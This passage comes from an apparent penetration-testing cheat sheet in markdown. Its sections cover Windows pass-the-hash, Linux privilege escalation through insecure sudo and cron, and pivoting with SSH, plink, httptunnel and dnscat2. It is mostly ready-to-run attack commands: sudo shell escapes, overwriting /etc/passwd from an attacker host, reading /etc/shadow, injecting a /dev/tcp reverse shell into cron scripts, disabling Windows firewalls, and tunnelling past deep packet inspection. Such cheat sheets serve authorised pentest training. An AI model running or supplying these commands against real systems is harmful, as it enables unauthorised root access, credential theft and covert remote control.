 https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283
 https://blog.cobaltstrike.com/2014/05/14/meterpreter-kiwi-extension-golden-ticket-howto/
 https://adsecurity.org/?tag=goldenticket
 https://forensicmethods.com/wp-content/uploads/2014/07/PassTheGolden_Ticket_v1_0.pdf
 https://k4r4koyun.com/win/kerberos-silver-ticket-attacks-and-a-quick-look-at-the-golden-tickets/
 https://blog.stealthbits.com/?s=golden+ticket
 ```
 ### Pass-The-Hash
 ```
 $ meterpreter > load mimikatz
 $ pth-winexe -U Administrator%"hash:hash" //<target> cmd.exe
 ```
 ### Windows Exploit Suggester
 ```
 $ ./windows-exploit-suggester.py --update
 $ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
 ```
 
 ## [↑](#table-of-contents) Linux Privileged Escalation Technics
 ### History files and User's files
 ```
 $ ls -la -R /home/*
 $ find . -type f 2>/dev/null | grep -v "/proc"
 $ history
 $ cat /home/*/.bash_history
 ```
 ### List Users on system
 ```
 $ cat /etc/passwd
 ```
 ### Un-secured SUDO
 ```
$ sudo job.sh
#/bin/bash
bash
sudo job.sh

$ sudo vi
Then type :shell and hit enter

$ sudo vim -c '!sh'

$ sudo nmap --interactive
nmap> !sh

$ sudo nano /etc/shadow
Then reset password for root user

$ sudo man man
Then type !sh and hit enter

$ sudo less /etc/hosts
Then type !sh and hit enter

$ sudo more /etc/hosts
Then type !sh and hit enter

$ sudo find /bin -name nano -exec /bin/sh \;

$ sudo awk 'BEGIN {system("/bin/sh")}'

$ sudo perl -e 'exec "/bin/bash";'

$ sudo python -c 'import pty;pty.spawn("/bin/bash")'

$ sudo wget http://<Attacker Address>:<binding port>/passwd -O /etc/passwd

$ sudo apache2 -f /etc/shadow

$ sudo mount -o bind /bin/bash /bin/mount

$ echo $’id\ncat /etc/shadow’ > /tmp/.test
$ chmod +x /tmp/.test
$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

$ sudo strace -o/dev/null /bin/bash
 ```
 ### Un-secured CRON Job
 ```
$ crontab -l
$ cat /etc/crontab
$ cat /etc/cron.daily/*
$ cat /etc/cron.weekly/*
$ cat /etc/cron.monthly/*

    Inject a Reverse shell once we founded weak permission file of jobs/tasks that run by high privilege users
        echo "bash -i >& /dev/tcp/x.x.x.x/4444 0>&1" >> script.file
        $ nc -nlvp 4444
 ```
 ### Weak files and folders permission
 ```
Finding SUID files
$ find / -perm -u=s -type f 2>/dev/null

Finding world-writeable folders
$ find / -writable -type d 2>/dev/null

Finding world-writeable files
$ find / -writable -type f 2>/dev/null | grep -v "/proc"
 ```
 ### Vulnerable Services
 ```
 Checking service running by root
 $ ps -aux | grep root

 Running netstat to find listening ports
 $ netstat -ano | grep LISTEN
 ```
 ### SearchSploit
 ```
 Ubuntu
 $ dpkg -l | cut -d " " -f 3 > software.txt

 Redhat / CentOS
 $ rpm -qa | cut -d "-" -f 1 > software.txt

 Then search all installed packages againts SearchSpoit
 $ cat software.txt | while read package; do searchsploit $package | grep "linux/local"; done
 ```
 ### Kernel exploit
 ```
 $ uname -a
 $ perl Linux_Exploit_Suggester.pl
 ```
 
 ### Metasploit
 ```
 meterpreter > getsystem
 ```
 
 
 ### Automated scripts
 ```
 LinEnum - http://www.rebootuser.com/?p=1758
 LinuxPrivChecker - http://www.securitysift.com/download/linuxprivchecker.py
 ```

## [↑](#table-of-contents) Usefull CMDs
```
* Disable firewall
netsh Advfirewall set allprofiles state off
netsh firewall show state
netsh firewall set opmode disable

* Show wifi password
netsh wlan show profile "WiFi-name" key=clear

* Kill running tasks
taskkill /f /pid xxxx
```

## [↑](#table-of-contents) Unicode
```
http%3A%2F%2F10.11.0.210%2F

%00 is a NULL
%20 is a SPACE
%31 is a :
%2F is a /

```

## [↑](#table-of-contents) Pivoting

### Port Forwarding - accept traffic on a given IP address and port and
    redirect it to a different IP address and port

    apt-get install rinetd

    cat /etc/rinetd.conf  
        \# bindadress bindport connectaddress connectport  
        w.x.y.z 53 a.b.c.d 80

### SSH Local Port Forwarding: supports bi-directional communication
    channels

    ssh <gateway> -L <local port to listen>:<remote
        host>:<remote port>

### SSH Remote Port Forwarding: Suitable for popping a remote shell on
    an internal non routable network

    ssh <gateway> -R <remote port to bind>:<local
        host>:<local port> 

### SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local
    attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
    network on ANY PORT

    ssh -D <local proxy port> -p <remote port>
        <target>

### Proxychains - Perform nmap scan within a DMZ from an external
    computer

    Create reverse SSH tunnel from Popped machine on :2222  
        
        ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com
        ssh -f -N -R 2222:<local host>:22 root@<remote host>

    Create a Dynamic application-level port forward on 8080 thru
        2222  
        
        ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>

    Leverage the SSH SOCKS server to perform Nmap scan on network
        using proxy chains  
        
        proxychains nmap --top-ports=20 -sT -Pn $target/24

### HTTP Tunneling  
      
      nc -vvn $target 8888

### Traffic Encapsulation - Bypassing deep packet inspection

    http tunnel  
        On server side:  
        sudo hts -F <server ip addr>:<port of your app> 80  
        On client side:  
        sudo htc -P <my proxy.com:proxy port> -F <port of your app> <server ip addr>:80 stunnel

### Tunnel Remote Desktop (RDP) from a Popped Windows machine to your
    network

    Tunnel on port 22  
    
        plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>

    Port 22 blocked? Try port 80? or 443?  
    
        plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80

### Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel
    (bypass deep packet inspection)

    Windows machine add required firewall rules without prompting the user

    netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes

    netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000

    netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080

    netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079

    Start the http tunnel client  
    
         httptunnel_client.exe

    Create HTTP reverse shell by connecting to localhost port 3000  
    
### PuTTY Link tunnel - SSH Tunneling

    Forward remote port to local address:  
    
         plink.exe -P 22 -l root -pw "1337" -R 445:<local host>:445 <remote host>

### SSH Pivoting

    SSH pivoting from one network to another:  
    
        ssh -D <local host>:1010 -p 22 user@<remote host>

### DNS Tunneling

    dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.

    Attacking Machine Installation:  
    
        apt-get update  
        apt-get -y install ruby-dev git make g++  
        gem install bundler  
        git clone https://github.com/iagox86/dnscat2.git  
        cd dnscat2/server  
        bundle install

    Run dnscat2:  
    
        ruby ./dnscat2.rb  
        dnscat2> New session established: 1422  
        dnscat2> session -i 1422

    Target Machine:  
        https://downloads.skullsecurity.org/dnscat2/
        https://github.com/lukebaggett/dnscat2-powershell/  
        
        dnscat --host <dnscat server ip>
	
## [↑](#table-of-contents) Tmux
	(Prefix) + ? - Tmux Help
	(Prefix) + z - Zoom terminal
	(Prefix) + c - Create new windows
	(Prefix) + 0 - Goto windows #0
	(Prefix) + 1 - Goto windows #1
	(Prefix) + s - send pane to windows number
	(Prefix) + j - join pane to windows number
	(Prefix) + [ - enter VI edit mode, page up page down, seach by use ? space bar to copy mode
	(Prefix) + ] - paste
	(Prefix) + Alt + Shift + P - Save pane to log file
	(Prefix) + % - Vertical
	(Prefix) + " - Horizontal
	(Prefix) + t - time

	tmux new -s [Name]
	tmux ls
	tmux attach -t [Name]
	tmux.conf

	Mouse support:
	Ctrl+b + :
	set -g mouse on
	
## [↑](#table-of-contents) Misc

### GREP / SED / AWK
```
# Find Strings in files
grep -H -i "Some Text Here" * -R | cut -d: -f1 | sort -u
	
# grep without comment
grep -vE '^#|^;|^$' /etc/php.ini
	
# find files and list
locate .pem |xargs ls -lah
```

### SSH-keygen
```
root@kali:~/.ssh# ssh-keygen                             
Generating public/private rsa key pair.                  
Enter file in which to save the key (/root/.ssh/id_rsa): targetname                                                 
chmod 600 targename
upload targename.pub to target /home/username/.ssh/authorized_keys
ssh i targetname username@x.x.x.x                      
```

### SSH Stuff
```
~C
```
 
### Misc CMDs
```
watch -n ls -la
watch -n cat someting.txt
```
 
